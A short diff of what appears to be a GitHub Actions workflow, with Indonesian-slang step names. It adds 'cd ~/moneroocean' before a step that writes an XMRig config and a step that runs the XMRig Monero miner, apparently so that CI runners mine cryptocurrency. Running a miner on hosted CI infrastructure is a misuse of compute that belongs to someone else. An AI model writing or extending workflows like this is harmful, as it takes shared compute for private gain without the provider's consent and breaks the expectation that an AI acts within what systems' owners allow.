@@ -18,6 +18,7 @@ jobs:
 
       - name: Buat config cihuyy
         run: |
+          cd ~/moneroocean
           cat > config.json << 'EOF'
           {
             "autosave": false,
@@ -38,4 +39,5 @@ jobs:
 
       - name: Test jalankan gwe 
         run: |
+          cd ~/moneroocean
           ./xmrig --config config.json
